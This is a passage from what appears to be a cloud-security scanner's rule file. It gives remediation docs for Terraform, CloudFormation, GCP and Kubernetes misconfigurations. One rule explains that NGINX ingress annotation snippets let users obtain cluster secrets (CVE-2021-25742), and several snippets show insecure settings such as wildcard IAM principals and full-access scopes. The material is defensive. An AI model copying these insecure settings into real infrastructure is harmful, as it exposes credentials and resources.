<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/compute/instances" target="_self">VM instances</a>.</li>
<li>Select the impacted VM instance.</li>
<li>If the instance is not stopped, click <strong>Stop</strong>. Wait for the instance to stop.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Scroll down to the <strong>Service Account</strong> section.</li>
<li>Select a different service account or ensure <strong>Allow full access to all Cloud APIs</strong> is not selected.</li>
<li>To save your changes, click <strong>Save</strong>. </li>
<li>Click <strong>START</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>Stop the instance:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances stop INSTANCE_NAME
</code></pre>
<ol start="2">
<li>Update the instance:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances set-service-account INSTANCE_NAME 
--serviceaccount=SERVICE_ACCOUNT 
--scopes [SCOPE1, SCOPE2...]
</code></pre>
<ol start="3">
<li>Restart the instance:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances start INSTANCE_NAME
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_compute_instance</li>
<li><strong>Field</strong>: service_account</li>
<li><strong>Argument</strong>: If<strong> email</strong> is set to the default service account, or not specified, <strong>scope</strong> should not contain full access api.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_compute_instance" "default" {
  name         = "test"
  machine_type = "n1-standard-1"
  zone         = "us-central1-a"
  service_account {
-    scopes = ["https://www.googleapis.com/auth/cloud-platform"]
-    email  = "[PROJECT_NUMBER]<a class="__cf_email__" data-cfemail="88a5ebe7e5f8fdfcedc8ecedfeede4e7f8edfaa6effbedfafee1ebede9ebebe7fde6fca6ebe7e5" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>""
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_iam_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_153</key>
    <name>Prevent All NGINX Ingress annotation snippets</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="nginx-ingress-has-annotation-snippets"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-nginx-ingress-has-annotation-snippets"></div>NGINX Ingress has annotation snippets</div><a aria-label="Skip link to NGINX Ingress has annotation snippets" class="heading-anchor-icon fa fa-anchor" href="#nginx-ingress-has-annotation-snippets"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Allowing custom snippet annotations in ingress-nginx enables a user, who can create or update ingress objects, to obtain all secrets in the cluster. The safest way is to disallow any usage of annotation snippets.</p>
<p>Learn more around <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-25742" target="_self">CVE-2021-25742</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: app-ingress
  annotations:  
-   nginx.ingress.kubernetes.io/server-snippet: |
-     location / {
-       return 200 'OK';
-     }
    kubernetes.io/ingress.class: "nginx"
spec:
  rules:
  - http:    
    paths:      
      - path: /exp        
        pathType: Prefix        
        backend:          
          service:            
            name: some-service            
            port:              
              number: 1234
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/prevent-all-nginx-ingress-annotation-snippets' target='_blank'> https://docs.bridgecrew.io/docs/prevent-all-nginx-ingress-annotation-snippets</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/prevent-all-nginx-ingress-annotation-snippets' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_15</key>
    <name>Ensure auto scaling groups associated with a load balancer use elastic load balancing health checks</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="auto-scaling-groups-associated-with-a-load-balancer-do-not-use-elastic-load-balancing-health-checks"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-auto-scaling-groups-associated-with-a-load-balancer-do-not-use-elastic-load-balancing-health-checks"></div>Auto scaling groups associated with a load balancer do not use elastic load balancing health checks</div><a aria-label="Skip link to Auto scaling groups associated with a load balancer do not use elastic load balancing health checks" class="heading-anchor-icon fa fa-anchor" href="#auto-scaling-groups-associated-with-a-load-balancer-do-not-use-elastic-load-balancing-health-checks"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p> To maintain the availability of the compute resources in the event of a failure and provide an evenly distributed application load ,ensure that your Amazon Auto Scaling Groups (ASGs) have associated Elastic Load Balancers in order. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_autoscaling_group, aws_autoscaling_attachment, aws_elb</li>
<li><strong>Argument:</strong> <em>autoscaling_group_name</em> and <em>elb</em> of aws_autoscaling_attachment</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_autoscaling_group" "autoscalling_ok" {
  max_size                  = 5
  min_size                  = 2
  health_check_grace_period = 300
  health_check_type         = "ELB"
  desired_capacity          = 4
  force_delete              = true

  lifecycle {
    ignore_changes = [load_balancers, target_group_arns]
  }
}

resource "aws_autoscaling_attachment" "test_ok_attachment" {
  autoscaling_group_name = aws_autoscaling_group.autoscalling_ok.id
  elb                    = aws_elb.test_ok.id
}

resource "aws_elb" "test_ok" {
  name               = "foobar-terraform-elb"
  availability_zones = ["us-west-2a", "us-west-2b", "us-west-2c"]

  access_logs {
    bucket        = "foo"
    bucket_prefix = "bar"
    interval      = 60
  }

  listener {
    instance_port     = 8000
    instance_protocol = "http"
    lb_port           = 80
    lb_protocol       = "http"
  }

  listener {
    instance_port      = 8000
    instance_protocol  = "http"
    lb_port            = 443
    lb_protocol        = "https"
    ssl_certificate_id = "arn:aws:iam::123456789012:server-certificate/certName"
  }

  health_check {
    healthy_threshold   = 2
    unhealthy_threshold = 2
    timeout             = 3
    target              = "HTTP:8000/"
    interval            = 30
  }

  instances                   = [aws_instance.foo.id]
  cross_zone_load_balancing   = true
  idle_timeout                = 400
  connection_draining         = true
  connection_draining_timeout = 400

  tags = {
    Name = "foobar-terraform-elb"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-auto-scaling-groups-that-are-associated-with-a-load-balancer-are-using-elastic-load-balancing-health-checks' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-auto-scaling-groups-that-are-associated-with-a-load-balancer-are-using-elastic-load-balancing-health-checks</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-auto-scaling-groups-that-are-associated-with-a-load-balancer-are-using-elastic-load-balancing-health-checks' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_18</key>
    <name>Ensure Amazon EFS has an AWS Backup backup plan</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="amazon-efs-does-not-have-an-aws-backup-backup-plan"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-amazon-efs-does-not-have-an-aws-backup-backup-plan"></div>Amazon EFS does not have an AWS Backup backup plan</div><a aria-label="Skip link to Amazon EFS does not have an AWS Backup backup plan" class="heading-anchor-icon fa fa-anchor" href="#amazon-efs-does-not-have-an-aws-backup-backup-plan"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure that Elastic File System (Amazon EFS) file systems are included in your backup plans for the AWS Backup.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_backup_plan, aws_backup_selection, aws_efs_file_system</li>
<li><strong>Argument:</strong> <em>plan_id</em> and <em>resources</em> of aws_backup_selection</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_backup_plan" "example" {
  name = "tf_example_backup_plan"

  rule {
    rule_name         = "tf_example_backup_rule"
    target_vault_name = aws_backup_vault.test.name
    schedule          = "cron(0 12 * * ? *)"
  }

  advanced_backup_setting {
    backup_options = {
      WindowsVSS = "enabled"
    }
    resource_type = "EC2"
  }
}

resource "aws_backup_selection" "ok_backup" {
  iam_role_arn = aws_iam_role.example.arn
  name         = "tf_example_backup_selection"
  plan_id      = aws_backup_plan.example.id

  resources = [
    aws_db_instance.example.arn,
    aws_ebs_volume.example.arn,
    aws_efs_file_system.ok_efs.arn,
  ]
}

resource "aws_efs_file_system" "ok_efs" {
  creation_token = "my-product"

  tags = {
    Name = "MyProduct"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-elastic-file-system-amazon-efs-file-systems-are-added-in-the-backup-plans-of-aws-backup' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-elastic-file-system-amazon-efs-file-systems-are-added-in-the-backup-plans-of-aws-backup</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-elastic-file-system-amazon-efs-file-systems-are-added-in-the-backup-plans-of-aws-backup' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_11</key>
    <name>Ensure AWS IAM password policy has a lowercase character</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-iam-password-policy-does-not-have-a-lowercase-character"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-iam-password-policy-does-not-have-a-lowercase-character"></div>AWS IAM password policy does not have a lowercase character</div><a aria-label="Skip link to AWS IAM password policy does not have a lowercase character" class="heading-anchor-icon fa fa-anchor" href="#aws-iam-password-policy-does-not-have-a-lowercase-character"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Password policies are used to enforce the creation and use of password complexity. Your IAM password policy should be set for passwords to require the inclusion of different character types. The password policy should enforce passwords contain at least one lowercase letter, this increases security, especially from a brute force attack.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.</p>
<p>To manually set the password policy with a minimum length, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console as an <strong>IAM user</strong> at <a href="https://console.aws.amazon.com/iam/" target="_self">https://console.aws.amazon.com/iam/</a>.</li>
<li>Navigate to <strong>IAM Services</strong>.</li>
<li>On the Left Pane click <strong>Account Settings</strong>.</li>
<li>Select <strong>Requires at least one lowercase letter</strong>. </li>
<li>Click <strong>Apply password policy</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To change the password policy, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws iam update-account-password-policy --require-lowercase-characters
</code></pre>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>All commands starting with <strong>aws iam update-account-password-policy</strong> can be combined into a single command.</p></blockquote> <br/> <a href='https://docs.bridgecrew.io/docs/iam_6' target='_blank'> https://docs.bridgecrew.io/docs/iam_6</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/iam_6' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_14</key>
    <name>Ensure AWS IAM password policy has a symbol</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-iam-password-policy-does-not-have-a-symbol"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-iam-password-policy-does-not-have-a-symbol"></div>AWS IAM password policy does not have a symbol</div><a aria-label="Skip link to AWS IAM password policy does not have a symbol" class="heading-anchor-icon fa fa-anchor" href="#aws-iam-password-policy-does-not-have-a-symbol"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Password policies are used to enforce the creation and use of password complexity. Your IAM password policy should be set for passwords to require the inclusion of different character types. The password policy should enforce passwords contain at least one symbol, this increases security, especially from a brute force attack.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.</p>
<p>To manually set the password policy with a minimum length, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console as an <strong>IAM user</strong> at <a href="https://console.aws.amazon.com/iam/" target="_self">https://console.aws.amazon.com/iam/</a>.</li>
<li>Navigate to <strong>IAM Services</strong>.</li>
<li>On the Left Pane click <strong>Account Settings</strong>.</li>
<li>Select <strong>Require at least one non-alphanumeric character</strong>. </li>
<li>Click <strong>Apply password policy</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To change the password policy, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws iam update-account-password-policy --require-symbols
</code></pre>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>All commands starting with <strong>aws iam update-account-password-policy</strong> can be combined into a single command.</p></blockquote> <br/> <a href='https://docs.bridgecrew.io/docs/iam_7' target='_blank'> https://docs.bridgecrew.io/docs/iam_7</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/iam_7' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_60</key>
    <name>Ensure IAM role allows only specific services or principals to be assumed</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="iam-role-does-not-allow-only-specific-services-or-principals-to-be-assumed"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-iam-role-does-not-allow-only-specific-services-or-principals-to-be-assumed"></div>IAM role does not allow only specific services or principals to be assumed</div><a aria-label="Skip link to IAM role does not allow only specific services or principals to be assumed" class="heading-anchor-icon fa fa-anchor" href="#iam-role-does-not-allow-only-specific-services-or-principals-to-be-assumed"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The IAM role is an identity with specific permissions. An IAM role is similar to an IAM user: it has an AWS identity with permission policies that determine what the identity can and cannot do in AWS. When a user assumes a role, it is provided with temporary security credentials for a bounded session.</p>
<p>The list of principals able to assume a role should be limited as much as possible, and should not include "*", meaning that any authenticated identity across all of AWS can assume the role.</p>
<p>We recommend that you define fine-grained roles for specific services or principles. For example, when setting up an AWS service role it is recommended to include only the permissions required for the service to access the AWS resources required. Alternatively, you can use a principal as an entity that can perform actions and access resources. The main benefit of the principal entity is to limit the use of wildcards in the policy document.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-iam-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-iam-console"></div>AWS IAM Console</div><a aria-label="Skip link to AWS IAM Console" class="heading-anchor-icon fa fa-anchor" href="#aws-iam-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/iam/" target="_self">Amazon IAM console</a>.</li>
<li>Click <strong>Roles</strong>, and find the role to update.</li>
<li>Click the <strong>Trust relationships</strong> tab.</li>
<li>Click <strong>Show policy document</strong> or <strong>Edit trust relationship</strong> to view the policy document.</li>
<li>After clicking <strong>Edit trust relationship</strong>, remove any "Allow" statements that have an AWS Principal including "*".</li>
<li>Click <strong>Update Trust Policy</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_iam_role" "test_role" {
  name = "test_role"
    ...
  assume_role_policy = &lt;&lt;EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Action": "sts:AssumeRole",
      "Principal": {
        "AWS": [
-         "*"
        ]
      },
      "Effect": "Allow",
      "Sid": ""
    }
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::IAM::Role</li>
<li><strong>Argument:</strong> Properties.AssumeRolePolicyDocument.Statement</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: 'AWS::IAM::Role'
    Properties:
      AssumeRolePolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Principal:
              "AWS":
-               - "*"
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_iam_44' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_iam_44</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_iam_44' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_48</key>
    <name>Ensure Amazon MQ Broker logging is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="amazon-mq-broker-logging-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-amazon-mq-broker-logging-is-not-enabled"></div>Amazon MQ Broker logging is not enabled</div><a aria-label="Skip link to Amazon MQ Broker logging is not enabled" class="heading-anchor-icon fa fa-anchor" href="#amazon-mq-broker-logging-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon MQ is a broker service built on Apache ActiveMQ. As a message broker, MQ allows applications to communicate using various programming languages, operating systems and formal messaging protocols.</p>
<p>Amazon MQ is integrated with CloudTrail and provides a record of the Amazon MQ calls made by a user, role, or AWS service. It supports logging both the request parameters and the responses for APIs as events in CloudTrail. Logging MQ ensures developers can trace all requests and responses, and ensure they are only used for their predefined message brokering settings.</p>
<p>We recommend you enable Amazon MQ Broker Logging.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_logging_10' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_logging_10</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_logging_10' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_18</key>
    <name>Ensure AWS access logging is enabled on S3 buckets</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-access-logging-is-not-enabled-on-s3-buckets"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-access-logging-is-not-enabled-on-s-3-buckets"></div>AWS access logging is not enabled on S3 buckets</div><a aria-label="Skip link to AWS access logging is not enabled on S3 buckets" class="heading-anchor-icon fa fa-anchor" href="#aws-access-logging-is-not-enabled-on-s3-buckets"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Access logging provides detailed audit logging for all objects and folders in an S3 bucket. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Lo gin to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/s3/" target="_self">Amazon S3 console</a>.</li>
